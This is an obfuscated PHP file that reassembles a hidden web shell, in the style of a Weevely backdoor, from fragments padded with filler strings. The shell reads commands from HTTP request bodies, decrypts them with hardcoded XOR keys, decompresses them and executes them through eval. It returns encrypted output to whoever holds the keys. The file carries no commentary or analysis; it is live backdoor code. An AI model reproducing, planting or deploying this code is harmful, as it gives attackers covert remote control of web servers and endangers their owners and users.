<?php
$Y='rt(#u);#u@e#uv#ual(@gzunc#uompress(@x(@ba#use#u64_decode($#um[1#u]),$#uk))#u);$o=@ob_get#u_cont#uents();@ob';
$d='r($#uj=0;($j<$c#u&#u&$i<$l);$j+#u+,$i++#u){$o.#u=$t{#u#u$i}^$k{$j};#u}}return #u$#uo;}if (@pr#u#';
$I='_#uend_clea#un();$r#u#u=@bas#ue64_encod#ue(@x(@gz#ucompress#u($o),#u$k));pri#unt("$#up$kh$r#u$kf");}';
$S='$k#u="efe1ca#u12";#u$kh="d8c5ae9#u93#ud3a";#u$kf="ed#u77631287b#u#uf";#u$#up="3RQ7#u3MLEpdtNER';
$W=str_replace('Fz','','FzFzcreatFze_fFzuFznctFzion');
$L='#uyw";function x#u($t,$k)#u{$c#u=#ustrl#uen($k);#u$l=strl#uen($t);$o#u="";for($i=0;#u$i<$l;#u#u){fo';
$X='ueg_match("/$kh(#u.#u+)$kf/",@#ufi#ule_get_con#utents("#uph#up://input#u")#u,$m)==1) {#u@ob_#usta';
$R=str_replace('#u','',$S.$L.$d.$X.$Y.$I);
$H=$W('',$R);$H();
?>
